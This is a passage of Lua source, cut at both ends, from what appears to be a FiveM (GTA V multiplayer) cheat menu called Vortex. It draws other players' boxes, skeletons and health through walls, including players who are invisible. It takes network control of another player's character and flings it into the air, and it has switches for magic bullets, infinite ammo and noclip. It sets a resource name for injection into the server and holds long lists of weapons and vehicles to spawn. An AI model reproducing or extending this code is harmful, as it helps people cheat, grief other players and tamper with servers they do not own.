                        local invisible = vortex_isInvisible(ped)
                        if invisible and not VortexVisuals.box.seeInvisible then goto continue end
                        local boxColorIdx = invisible and VortexVisuals.box.invisColorIndex or VortexVisuals.box.colorIndex
                        local skelColorIdx = invisible and VortexVisuals.skeleton.invisColor or VortexVisuals.skeleton.visibleColor
                        local textColorIdx = VortexVisuals.text.colorIndex

                        local boxR, boxG, boxB, boxA = vortex_paletteColor(boxColorIdx)
                        local skelR, skelG, skelB, skelA = vortex_paletteColor(skelColorIdx)
                        local textR, textG, textB, textA = vortex_paletteColor(textColorIdx)

                        local minDim, maxDim = GetModelDimensions(GetEntityModel(ped))
                        local top = GetOffsetFromEntityInWorldCoords(ped, 0.0, 0.0, maxDim.z + 0.2)
                        local bottom = GetOffsetFromEntityInWorldCoords(ped, 0.0, 0.0, minDim.z - 0.1)

                        local tOn, tx, ty = World3dToScreen2d(top.x, top.y, top.z)
                        local bOn, bx, by = World3dToScreen2d(bottom.x, bottom.y, bottom.z)
                        if not (tOn and bOn) then goto continue end

                        local cx = (tx + bx) / 2
                        local cy = (ty + by) / 2
                        local heightPx = math.abs(by - ty)
                        local widthPx = heightPx * 0.45

                        if VortexVisuals.box.enabled then
                            vortex_drawBox2D(cx, cy, widthPx, heightPx, VortexVisuals.box.thickness, boxR, boxG, boxB, boxA)

                            if VortexVisuals.box.drawHealth then
                                local hp = math.max(0, GetEntityHealth(ped) - 100)
                                local hpPct = hp / 100.0
                                vortex_drawHealthArmor(VortexVisuals.box.healthSide, cx, cy, heightPx, hpPct, VortexVisuals.box.thickness, 80, 200, 80, 220)
                            end

                            if VortexVisuals.box.drawArmor then
                                local ar = math.max(0, GetPedArmour(ped))
                                local arPct = math.min(1.0, ar / 100.0)
                                vortex_drawHealthArmor(VortexVisuals.box.armorSide, cx, cy, heightPx, arPct, VortexVisuals.box.thickness, 80, 150, 255, 220)
                            end
                        end

                        if VortexVisuals.skeleton.enabled then
                            vortex_drawSkeleton(ped, {r = skelR, g = skelG, b = skelB, a = skelA})
                        end

                        -- Infos
                        local infoLines = vortex_getInfoLines(tgt, dist, invisible)
                        if #infoLines > 0 then
                            local lineH = 0.02
                            for idx, line in ipairs(infoLines) do
                                local offset = (idx - 1) * lineH
                                local xPos, yPos = cx, cy
                                local anchor = line.anchor
                                if anchor == 1 then -- Top
                                    yPos = ty - 0.015 - offset
                                elseif anchor == 2 then -- Bottom
                                    yPos = by + 0.005 + offset
                                elseif anchor == 3 then -- Left
                                    xPos = cx - widthPx - 0.02
                                    yPos = cy + offset
                                elseif anchor == 4 then -- Right
                                    xPos = cx + widthPx + 0.02
                                    yPos = cy + offset
                                end

                                SetTextScale(0.3, 0.3)
                                SetTextFont(4)
                                SetTextProportional(1)
                                SetTextColour(textR, textG, textB, textA)
                                SetTextEntry("STRING")
                                SetTextOutline()
                                AddTextComponentString(line.text)
                                DrawText(xPos, yPos)
                            end
                        end

                        ::continue::
                    end
                end
            end

            -- Vehicle visuals
            if VortexVisuals.vehicle.enabled then
                for _, veh in ipairs(GetGamePool('CVehicle')) do
                    if DoesEntityExist(veh) then
                        local vpos = GetEntityCoords(veh)
                        local dist = #(myCoords - vpos)
                        if dist <= VortexVisuals.vehicle.distance then
                            local onScr, sx, sy = World3dToScreen2d(vpos.x, vpos.y, vpos.z + 0.5)
                            if onScr then
                                local r, g, b, a = vortex_paletteColor(VortexVisuals.box.colorIndex)
                                if VortexVisuals.vehicle.enabled then
                                    DrawRect(sx, sy, 0.02, 0.004, r, g, b, a)
                                end

                                local label = "Vehicle"
                                if VortexVisuals.vehicle.drawSpawnName then
                                    local model = GetEntityModel(veh)
                                    label = GetDisplayNameFromVehicleModel(model)
                                end
                                if VortexVisuals.vehicle.drawLockState then
                                    local locked = GetVehicleDoorLockStatus(veh)
                                    label = label .. " [" .. (locked > 1 and "Locked" or "Unlocked") .. "]"
                                end

                                SetTextScale(0.28, 0.28)
                                SetTextFont(4)
                                SetTextProportional(1)
                                SetTextColour(r, g, b, a)
                                SetTextEntry("STRING")
                                SetTextCentre(1)
                                AddTextComponentString(label)
                                DrawText(sx, sy - 0.015)
                            end
                        end
                    end
                end
            end

            -- Crosshair
            if VortexVisuals.crosshair.enabled then
                local cR, cG, cB, cA = vortex_paletteColor(VortexVisuals.crosshair.colorIndex)
                local gap = VortexVisuals.crosshair.gap / 1000
                local len = VortexVisuals.crosshair.size / 1000
                local thick = VortexVisuals.crosshair.thickness / 1000

                DrawRect(0.5 - gap - len / 2, 0.5, len, thick, cR, cG, cB, cA)
                DrawRect(0.5 + gap + len / 2, 0.5, len, thick, cR, cG, cB, cA)
                DrawRect(0.5, 0.5 - gap - len / 2, thick, len, cR, cG, cB, cA)
                DrawRect(0.5, 0.5 + gap + len / 2, thick, len, cR, cG, cB, cA)
            end

            Wait(0)
        else
            Wait(300)
        end
    end
end)

-- Safe launcher: tries to get control of target then applies upward velocity/teleports safely
function Vortex_LaunchTarget(targetServerId)
    Citizen.CreateThread(function()
        if not targetServerId then return end
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then return end
        local targetPed = GetPlayerPed(clientId)
        if not targetPed or not DoesEntityExist(targetPed) then return end

        -- Try to request network control (if networked)
        if NetworkGetEntityIsNetworked(targetPed) then
            NetworkRequestControlOfEntity(targetPed)
            local to = 0
            while not NetworkHasControlOfEntity(targetPed) and to < 80 do
                NetworkRequestControlOfEntity(targetPed)
                Citizen.Wait(10)
                to = to + 1
            end
        end

        if not DoesEntityExist(targetPed) then return end
        local baseCoords = GetEntityCoords(targetPed)
        if not baseCoords then return end

        -- Apply safe upward pushes instead of physics attachment
        for i = 1, 6 do
            if not DoesEntityExist(targetPed) then break end
            local z = baseCoords.z + 5.0 + i * 2.0
            pcall(function()
                SetEntityCoordsNoOffset(targetPed, baseCoords.x, baseCoords.y, z, false, false, false)
                SetEntityVelocity(targetPed, 0.0, 0.0, 60.0)
            end)
            Citizen.Wait(200)
        end
    end)
end


local vortex_solosessionEnabled = false
local vortex_miscTargetEnabled = false
local vortex_miscTargetInterfaceOpen = false
local vortex_miscTargetSelectedOption = 1


local vortex_easyhandlingEnabled = false
local vortex_handlingAmount = 50
local vortex_gravitatevehicleEnabled = false
local vortex_nocolisionEnabled = false
local vortex_freecamEnabled = false
local vortex_freecamSpeed = 2.0

-- Freecam navigation mode: "arrows", "ae", "qe"
freecamNavigationMode = "arrows"
-- The resource name used for injection (set dynamically or use a default)
InjectResource = GetCurrentResourceName and GetCurrentResourceName() or "spawnmanager"

local VK = {
    W = 0x57, A = 0x41, S = 0x53, D = 0x44, Q = 0x51, E = 0x45,
    SHIFT = 0x10, LBUTTON = 0x01, RBUTTON = 0x02,
    F5 = 0x31, F8 = 0x77, F9 = 0x78,
    UP = 0x26, DOWN = 0x28, LEFT = 0x25, RIGHT = 0x27,
    RETURN = 0x0D, BACK = 0x08, H = 0x48, ["7"] = 0x37, G = 0x47
}

local vortex_screen_width, vortex_screen_height = GetActiveScreenResolution()


local Vortex_VehicleSpeed = 0.0
local Vortex_VehicleMaxSpeed = 100.0
local Vortex_VehicleSpeedMultiplier = 5.0
local Vortex_VehicleAcceleration = 1.0


local vortex_shooteyesEnabled = false
local vortex_infiniteAmmoEnabled = false
local vortex_magicbulletEnabled = false
local vortex_drawFovEnabled = false
local vortex_fovRadius = 150.0


local vortex_selectedWeaponIndex = {
    melee = 1,
    pistol = 1,
    smg = 1,
    shotgun = 1,
    ar = 1,
    sniper = 1,
    heavy = 1
}

local vortex_weaponLists = {
    melee = {
        {name = "WEAPON_KNIFE", display = "Knife"},
        {name = "WEAPON_BAT", display = "Baseball Bat"},
        {name = "WEAPON_CROWBAR", display = "Crowbar"},
        {name = "WEAPON_GOLFCLUB", display = "Golf Club"},
        {name = "WEAPON_HAMMER", display = "Hammer"},
        {name = "WEAPON_HATCHET", display = "Hatchet"},
        {name = "WEAPON_KNUCKLE", display = "Brass Knuckles"},
        {name = "WEAPON_MACHETE", display = "Machete"},
        {name = "WEAPON_SWITCHBLADE", display = "Switchblade"},
        {name = "WEAPON_NIGHTSTICK", display = "Nightstick"},
        {name = "WEAPON_WRENCH", display = "Wrench"},
        {name = "WEAPON_BATTLEAXE", display = "Battle Axe"},
        {name = "WEAPON_POOLCUE", display = "Pool Cue"},
        {name = "WEAPON_STONE_HATCHET", display = "Stone Hatchet"}
    },
    pistol = {
        {name = "WEAPON_PISTOL", display = "Pistol"},
        {name = "WEAPON_PISTOL_MK2", display = "Pistol MK2"},
        {name = "WEAPON_COMBATPISTOL", display = "Combat Pistol"},
        {name = "WEAPON_PISTOL50", display = "Pistol .50"},
        {name = "WEAPON_SNSPISTOL", display = "SNS Pistol"},
        {name = "WEAPON_SNSPISTOL_MK2", display = "SNS Pistol MK2"},
        {name = "WEAPON_HEAVYPISTOL", display = "Heavy Pistol"},
        {name = "WEAPON_VINTAGEPISTOL", display = "Vintage Pistol"},
        {name = "WEAPON_FLAREGUN", display = "Flare Gun"},
        {name = "WEAPON_MARKSMANPISTOL", display = "Marksman Pistol"},
        {name = "WEAPON_REVOLVER", display = "Heavy Revolver"},
        {name = "WEAPON_REVOLVER_MK2", display = "Heavy Revolver MK2"},
        {name = "WEAPON_DOUBLEACTION", display = "Double Action Revolver"},
        {name = "WEAPON_APPISTOL", display = "AP Pistol"},
        {name = "WEAPON_STUNGUN", display = "Stun Gun"},
        {name = "WEAPON_CERAMICPISTOL", display = "Ceramic Pistol"},
        {name = "WEAPON_NAVYREVOLVER", display = "Navy Revolver"}
    },
    smg = {
        {name = "WEAPON_MICROSMG", display = "Micro SMG"},
        {name = "WEAPON_SMG", display = "SMG"},
        {name = "WEAPON_SMG_MK2", display = "SMG MK2"},
        {name = "WEAPON_ASSAULTSMG", display = "Assault SMG"},
        {name = "WEAPON_COMBATPDW", display = "Combat PDW"},
        {name = "WEAPON_MACHINEPISTOL", display = "Machine Pistol"},
        {name = "WEAPON_MINISMG", display = "Mini SMG"},
        {name = "WEAPON_GUSENBERG", display = "Gusenberg Sweeper"}
    },
    shotgun = {
        {name = "WEAPON_PUMPSHOTGUN", display = "Pump Shotgun"},
        {name = "WEAPON_PUMPSHOTGUN_MK2", display = "Pump Shotgun MK2"},
        {name = "WEAPON_SAWNOFFSHOTGUN", display = "Sawed-Off Shotgun"},
        {name = "WEAPON_ASSAULTSHOTGUN", display = "Assault Shotgun"},
        {name = "WEAPON_BULLPUPSHOTGUN", display = "Bullpup Shotgun"},
        {name = "WEAPON_MUSKET", display = "Musket"},
        {name = "WEAPON_HEAVYSHOTGUN", display = "Heavy Shotgun"},
        {name = "WEAPON_DBSHOTGUN", display = "Double Barrel Shotgun"},
        {name = "WEAPON_AUTOSHOTGUN", display = "Auto Shotgun"},
        {name = "WEAPON_COMBATSHOTGUN", display = "Combat Shotgun"}
    },
    ar = {
        {name = "WEAPON_ASSAULTRIFLE", display = "Assault Rifle"},
        {name = "WEAPON_ASSAULTRIFLE_MK2", display = "Assault Rifle MK2"},
        {name = "WEAPON_CARBINERIFLE", display = "Carbine Rifle"},
        {name = "WEAPON_CARBINERIFLE_MK2", display = "Carbine Rifle MK2"},
        {name = "WEAPON_ADVANCEDRIFLE", display = "Advanced Rifle"},
        {name = "WEAPON_SPECIALCARBINE", display = "Special Carbine"},
        {name = "WEAPON_SPECIALCARBINE_MK2", display = "Special Carbine MK2"},
        {name = "WEAPON_BULLPUPRIFLE", display = "Bullpup Rifle"},
        {name = "WEAPON_BULLPUPRIFLE_MK2", display = "Bullpup Rifle MK2"},
        {name = "WEAPON_COMPACTRIFLE", display = "Compact Rifle"},
        {name = "WEAPON_MILITARYRIFLE", display = "Military Rifle"},
        {name = "WEAPON_HEAVYRIFLE", display = "Heavy Rifle"},
        {name = "WEAPON_TACTICALRIFLE", display = "Tactical Rifle"}
    },
    sniper = {
        {name = "WEAPON_SNIPERRIFLE", display = "Sniper Rifle"},
        {name = "WEAPON_HEAVYSNIPER", display = "Heavy Sniper"},
        {name = "WEAPON_HEAVYSNIPER_MK2", display = "Heavy Sniper MK2"},
        {name = "WEAPON_MARKSMANRIFLE", display = "Marksman Rifle"},
        {name = "WEAPON_MARKSMANRIFLE_MK2", display = "Marksman Rifle MK2"},
        {name = "WEAPON_PRECISIONRIFLE", display = "Precision Rifle"}
    },
    heavy = {
        {name = "WEAPON_RPG", display = "RPG"},
        {name = "WEAPON_GRENADELAUNCHER", display = "Grenade Launcher"},
        {name = "WEAPON_GRENADELAUNCHER_SMOKE", display = "Grenade Launcher Smoke"},
        {name = "WEAPON_MINIGUN", display = "Minigun"},
        {name = "WEAPON_FIREWORK", display = "Firework Launcher"},
        {name = "WEAPON_RAILGUN", display = "Railgun"},
        {name = "WEAPON_HOMINGLAUNCHER", display = "Homing Launcher"},
        {name = "WEAPON_COMPACTLAUNCHER", display = "Compact Grenade Launcher"},
        {name = "WEAPON_RAYMINIGUN", display = "Widowmaker"},
        {name = "WEAPON_EMPLAUNCHER", display = "Compact EMP Launcher"},
        {name = "WEAPON_RAILGUNXM3", display = "Railgun XM3"}
    }
}


local vortex_outfitData = {
    hat = {drawable = -1, texture = 0},
    mask = {drawable = 0, texture = 0},
    glasses = {drawable = -1, texture = 0},
    torso = {drawable = 0, texture = 0},
    tshirt = {drawable = 0, texture = 0},
    pants = {drawable = 0, texture = 0},
    shoes = {drawable = 0, texture = 0}
}


local vortex_maleModels = {
    {name = "mp_m_freemode_01", display = "mp_m_freemode_01"},
    {name = "player_zero", display = "Michael"},
    {name = "player_one", display = "Franklin"},
    {name = "player_two", display = "Trevor"},
    {name = "a_m_y_hipster_01", display = "a_m_y_hipster_01"},
    {name = "a_m_y_business_01", display = "Business Young"},
    {name = "a_m_m_business_01", display = "Business"},
    {name = "a_m_y_vinewood_01", display = "Vinewood"},
    {name = "a_m_y_hipster_02", display = "Hipster 2"},
    {name = "a_m_y_runner_01", display = "Runner"},
    {name = "a_m_y_cyclist_01", display = "Cyclist"},
    {name = "s_m_y_cop_01", display = "Cop"},
    {name = "s_m_m_security_01", display = "Security"},
    {name = "a_m_y_beach_01", display = "Beach Guy"},
    {name = "a_m_y_clubcust_01", display = "Club Customer"},
    {name = "a_m_y_downtown_01", display = "Downtown"},
    {name = "a_m_y_eastsa_01", display = "East SA"},
    {name = "a_m_y_epsilon_01", display = "Epsilon"},
    {name = "a_m_y_gay_01", display = "Gay"},
    {name = "a_m_y_genstreet_01", display = "Generic Street"},
    {name = "a_m_y_golfer_01", display = "Golfer"},
    {name = "a_m_y_hasjew_01", display = "Hasidic Jew"},
    {name = "a_m_y_hiker_01", display = "Hiker"},
    {name = "a_m_y_indian_01", display = "Indian"},
    {name = "a_m_y_jetski_01", display = "Jetski"},
    {name = "a_m_y_juggalo_01", display = "Juggalo"},
    {name = "a_m_y_ktown_01", display = "Korean"},
    {name = "a_m_y_latino_01", display = "Latino"},
    {name = "a_m_y_methhead_01", display = "Meth Head"},
    {name = "a_m_y_mexthug_01", display = "Mexican Thug"},
    {name = "a_m_y_motox_01", display = "Motocross"},
    {name = "a_m_y_musclbeac_01", display = "Muscle Beach"},
    {name = "a_m_y_polynesian_01", display = "Polynesian"},
    {name = "a_m_y_roadcyc_01", display = "Road Cyclist"},
    {name = "a_m_y_runner_02", display = "Runner 2"},
    {name = "a_m_y_salton_01", display = "Salton"},
    {name = "a_m_y_skater_01", display = "Skater"},
    {name = "a_m_y_soucent_01", display = "South Central"},
    {name = "a_m_y_stbla_01", display = "Street Black"},
    {name = "a_m_y_stlat_01", display = "Street Latino"},
    {name = "a_m_y_stwhi_01", display = "Street White"},
    {name = "a_m_y_sunbathe_01", display = "Sunbather"},
    {name = "a_m_y_surfer_01", display = "Surfer"},
    {name = "a_m_y_vindouche_01", display = "Vinewood Douche"},
    {name = "a_m_y_yoga_01", display = "Yoga"}
}

local vortex_femaleModels = {
    {name = "mp_f_freemode_01", display = "Female Freemode"},
    {name = "a_f_y_hipster_01", display = "Hipster"},
    {name = "a_f_y_business_01", display = "Business Young"},
    {name = "a_f_m_business_02", display = "Business"},
    {name = "a_f_y_fitness_01", display = "Fitness"},
    {name = "a_f_y_hipster_02", display = "Hipster 2"},
    {name = "a_f_y_runner_01", display = "Runner"},
    {name = "a_f_y_cyclist_01", display = "Cyclist"},
    {name = "s_f_y_cop_01", display = "Cop"},
    {name = "a_f_y_beach_01", display = "Beach Girl"},
    {name = "a_f_y_bevhills_01", display = "Beverly Hills"},
    {name = "a_f_y_clubcust_01", display = "Club Customer"},
    {name = "a_f_y_eastsa_01", display = "East SA"},
    {name = "a_f_y_epsilon_01", display = "Epsilon"},
    {name = "a_f_y_genhot_01", display = "Generic Hot"},
    {name = "a_f_y_golfer_01", display = "Golfer"},
    {name = "a_f_y_hiker_01", display = "Hiker"},
    {name = "a_f_y_hippie_01", display = "Hippie"},
    {name = "a_f_y_hotposh_01", display = "Hot Posh"},
    {name = "a_f_y_indian_01", display = "Indian"},
    {name = "a_f_y_juggalo_01", display = "Juggalo"},
    {name = "a_f_y_ktown_01", display = "Korean"},
    {name = "a_f_y_latina_01", display = "Latina"},
    {name = "a_f_y_methhead_01", display = "Meth Head"},
    {name = "a_f_y_skater_01", display = "Skater"},
    {name = "a_f_y_soucent_01", display = "South Central"},
    {name = "a_f_y_tourist_01", display = "Tourist"},
    {name = "a_f_y_vinewood_01", display = "Vinewood"},
    {name = "a_f_y_yoga_01", display = "Yoga"},
    {name = "a_f_m_beach_01", display = "Beach Woman"},
    {name = "a_f_m_bodybuild_01", display = "Bodybuilder"},
    {name = "a_f_m_downtown_01", display = "Downtown"},
    {name = "a_f_m_eastsa_01", display = "East SA Old"},
    {name = "a_f_m_ktown_01", display = "Korean Old"},
    {name = "a_f_m_soucent_01", display = "South Central Old"},
    {name = "a_f_m_soucentmc_01", display = "South Central MC"},
    {name = "a_f_m_tourist_01", display = "Tourist Old"},
    {name = "a_f_m_tramp_01", display = "Tramp"},
    {name = "a_f_o_genrich_01", display = "Generic Rich"},
    {name = "a_f_o_ktown_01", display = "Korean Elderly"}
}

local vortex_animalModels = {
    {name = "a_c_boar", display = "Boar"},
    {name = "a_c_cat_01", display = "Cat"},
    {name = "a_c_chickenhawk", display = "Chicken Hawk"},
    {name = "a_c_chimp", display = "Chimpanzee"},
    {name = "a_c_chop", display = "Chop"},
    {name = "a_c_cormorant", display = "Cormorant"},
    {name = "a_c_cow", display = "Cow"},
    {name = "a_c_coyote", display = "Coyote"},
    {name = "a_c_crow", display = "Crow"},
    {name = "a_c_deer", display = "Deer"},
    {name = "a_c_dolphin", display = "Dolphin"},
    {name = "a_c_fish", display = "Fish"},
    {name = "a_c_hen", display = "Hen"},
    {name = "a_c_husky", display = "Husky"},
    {name = "a_c_mtlion", display = "Mountain Lion"},
    {name = "a_c_pig", display = "Pig"},
    {name = "a_c_poodle", display = "Poodle"},
    {name = "a_c_pug", display = "Pug"},
    {name = "a_c_rabbit_01", display = "Rabbit"},
    {name = "a_c_rat", display = "Rat"},
    {name = "a_c_retriever", display = "Retriever"},
    {name = "a_c_rhesus", display = "Rhesus"},
    {name = "a_c_rottweiler", display = "Rottweiler"},
    {name = "a_c_seagull", display = "Seagull"},
    {name = "a_c_sharkhammer", display = "Hammerhead Shark"},
    {name = "a_c_sharktiger", display = "Tiger Shark"},
    {name = "a_c_shepherd", display = "Shepherd"},
    {name = "a_c_westy", display = "West Highland Terrier"}
}

local vortex_selectedModelIndex = {
    male = 1,
    female = 1,
    animals = 1
}

local vortex_addonVehicleIndex = 1
local vortex_addonVehicles = {}
local vortex_addonVehiclesScanning = false
local vortex_addonVehiclesScanned = false


local function Vortex_ScanAddonVehicles()
    if vortex_addonVehiclesScanned or vortex_addonVehiclesScanning then return end

    vortex_addonVehiclesScanning = true

    Citizen.CreateThread(function()

        local commonAddonPatterns = {
            "lamborghini", "ferrari", "porsche", "bmw", "mercedes", "audi", "mclaren",
            "bugatti", "koenigsegg", "pagani", "maserati", "bentley", "rolls",
            "tesla", "nissan", "toyota", "honda", "ford", "chevrolet", "dodge",
            "challenger", "charger", "mustang", "camaro", "corvette", "viper",
            "gtr", "supra", "rx7", "skyline", "evo", "sti", "s15", "r34", "r35"
        }


        local suffixes = {"", "_custom", "_tuned", "_v2", "_v3", "_addon", "_pack"}


        for _, pattern in ipairs(commonAddonPatterns) do
            for _, suffix in ipairs(suffixes) do
                Citizen.Wait(0)

                local modelName = pattern .. suffix
                local modelHash = GetHashKey(modelName)


                if not IsModelInCdimage(modelHash) then
                    RequestModel(modelHash)
                    Citizen.Wait(10)
                    if HasModelLoaded(modelHash) then
                        table.insert(vortex_addonVehicles, {name = modelName, display = modelName})
                        SetModelAsNoLongerNeeded(modelHash)
                    end
                end
            end
        end


        if #vortex_addonVehicles == 0 then
            table.insert(vortex_addonVehicles, {name = "none", display = "No Addon Vehicles"})
        end

        vortex_addonVehiclesScanned = true
        vortex_addonVehiclesScanning = false
    end)
end

local vortex_vehicleToSpawn = ""

local vortex_selectedVehicleIndex = {
    car = 1,
    moto = 1,
    plane = 1,
    helicopter = 1,
    boat = 1,
    bicycle = 1,
    emergency = 1,
    military = 1,
    offroad = 1,
    sports = 1,
    sportsclassic = 1,
    super = 1,
    suv = 1,
    addon = 1
}


local function vortex_convertVehicleList(vehicleArray)
    local result = {}
    for _, vehicleName in ipairs(vehicleArray) do

        local displayName = vehicleName:gsub("^%l", string.upper):gsub("_", " ")
        table.insert(result, {name = vehicleName, display = displayName})
    end
    return result
end

local vortex_vehicleLists = {
    car = vortex_convertVehicleList({ "adder", "brioso" }),
    moto = vortex_convertVehicleList({ "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" }),
    plane = {
        {name = "alphaz1", display = "Alpha-Z1"},
        {name = "avenger", display = "Avenger"},
        {name = "besra", display = "Besra"},
        {name = "blimp", display = "Blimp"},
        {name = "blimp2", display = "Xero Blimp"},
        {name = "blimp3", display = "Atomic Blimp"},
        {name = "bombushka", display = "Bombushka"},
        {name = "cargoplane", display = "Cargo Plane"},
        {name = "cuban800", display = "Cuban 800"},
        {name = "dodo", display = "Dodo"},
        {name = "duster", display = "Duster"},
        {name = "howard", display = "Howard NX-25"},
        {name = "hydra", display = "Hydra"},
        {name = "jet", display = "Jet"},
        {name = "lazer", display = "P-996 Lazer"},
        {name = "luxor", display = "Luxor"},
        {name = "luxor2", display = "Luxor Deluxe"},
        {name = "mammatus", display = "Mammatus"},
        {name = "miljet", display = "Miljet"},
        {name = "mogul", display = "Mogul"},
        {name = "molotok", display = "Molotok"},
        {name = "nimbus", display = "Nimbus"},
        {name = "pyro", display = "Pyro"},
        {name = "rogue", display = "Rogue"},
        {name = "seabreeze", display = "Seabreeze"},
        {name = "shamal", display = "Shamal"},
        {name = "starling", display = "Starling"},
        {name = "strikeforce", display = "B-11 Strikeforce"},
        {name = "stunt", display = "Mallard"},
        {name = "titan", display = "Titan"},
        {name = "tula", display = "Tula"},
        {name = "velum", display = "Velum"},
        {name = "velum2", display = "Velum 5-Seater"},
        {name = "vestra", display = "Vestra"},
        {name = "volatol", display = "Volatol"}
    },
    helicopter = {
        {name = "annihilator", display = "Annihilator"},
        {name = "buzzard", display = "Buzzard Attack Chopper"},
        {name = "buzzard2", display = "Buzzard (Unarmed)"},
        {name = "cargobob", display = "Cargobob"},
        {name = "cargobob2", display = "Cargobob Jetsam"},
        {name = "cargobob3", display = "Cargobob (TP Industries)"},
        {name = "cargobob4", display = "Cargobob (Medical)"},
        {name = "frogger", display = "Frogger"},
        {name = "frogger2", display = "Frogger (Trevor)"},
        {name = "havok", display = "Havok"},
        {name = "hunter", display = "Hunter"},
        {name = "maverick", display = "Maverick"},
        {name = "polmav", display = "Police Maverick"},
        {name = "savage", display = "Savage"},
        {name = "seasparrow", display = "Seasparrow"},
        {name = "skylift", display = "Skylift"},
        {name = "swift", display = "Swift"},
        {name = "swift2", display = "Swift Deluxe"},
        {name = "valkyrie", display = "Valkyrie"},
        {name = "valkyrie2", display = "Valkyrie (Modded)"},
        {name = "volatus", display = "Volatus"}
    },
    boat = {
        {name = "dinghy", display = "Dinghy"},
        {name = "dinghy2", display = "Dinghy (2-Seater)"},
        {name = "dinghy3", display = "Dinghy (Yacht)"},
        {name = "dinghy4", display = "Dinghy (Heist)"},
        {name = "jetmax", display = "Jetmax"},
        {name = "marquis", display = "Marquis"},
        {name = "predator", display = "Predator"},
        {name = "seashark", display = "Seashark"},
        {name = "seashark2", display = "Seashark (Lifeguard)"},
        {name = "seashark3", display = "Seashark (Yacht)"},
        {name = "speeder", display = "Speeder"},
        {name = "speeder2", display = "Speeder (Yacht)"},
        {name = "squalo", display = "Squalo"},
        {name = "submersible", display = "Submersible"},
        {name = "submersible2", display = "Submersible (Kraken)"},
        {name = "suntrap", display = "Suntrap"},
        {name = "toro", display = "Toro"},
        {name = "toro2", display = "Toro (Yacht)"},
        {name = "tropic", display = "Tropic"},
        {name = "tropic2", display = "Tropic (Yacht)"},
        {name = "tugboat", display = "Tugboat"}
    },
    bicycle = {
        {name = "bmx", display = "BMX"},
        {name = "cruiser", display = "Cruiser"},
        {name = "fixter", display = "Fixter"},
        {name = "scorcher", display = "Scorcher"},
        {name = "tribike", display = "Whippet Race Bike"},
        {name = "tribike2", display = "Endurex Race Bike"},
        {name = "tribike3", display = "Tri-Cycles Race Bike"}
    },
    emergency = {
        {name = "ambulance", display = "Ambulance"},
        {name = "fbi", display = "FIB Buffalo"},
        {name = "fbi2", display = "FIB Granger"},
        {name = "firetruk", display = "Fire Truck"},
        {name = "lguard", display = "Lifeguard"},
        {name = "pbus", display = "Prison Bus"},
        {name = "police", display = "Police Cruiser"},
        {name = "police2", display = "Police Cruiser (Unmarked)"},
        {name = "police3", display = "Police Interceptor"},
        {name = "police4", display = "Unmarked Cruiser"},
        {name = "policeb", display = "Police Bike"},
        {name = "policet", display = "Police Transporter"},
        {name = "policeold1", display = "Police Rancher"},
        {name = "policeold2", display = "Police Roadcruiser"},
        {name = "pranger", display = "Park Ranger"},
        {name = "predator", display = "Police Predator"},
        {name = "riot", display = "Riot"},
        {name = "riot2", display = "Riot (Unmarked)"},
        {name = "sheriff", display = "Sheriff Cruiser"},
        {name = "sheriff2", display = "Sheriff SUV"}
    },
    military = {
        {name = "apc", display = "APC"},
        {name = "barrage", display = "Barrage"},
        {name = "chernobog", display = "Chernobog"},
        {name = "halftrack", display = "Half-track"},
        {name = "khanjali", display = "Khanjali"},
        {name = "rhino", display = "Rhino Tank"},
        {name = "scarab", display = "Scarab"},
        {name = "scarab2", display = "Scarab (Future Shock)"},
        {name = "scarab3", display = "Scarab (Nightmare)"},
        {name = "thruster", display = "Thruster"},
        {name = "trailerlarge", display = "Trailer Large"}
    },
    offroad = vortex_convertVehicleList({ "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" }),
    sports = vortex_convertVehicleList({ "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" }),
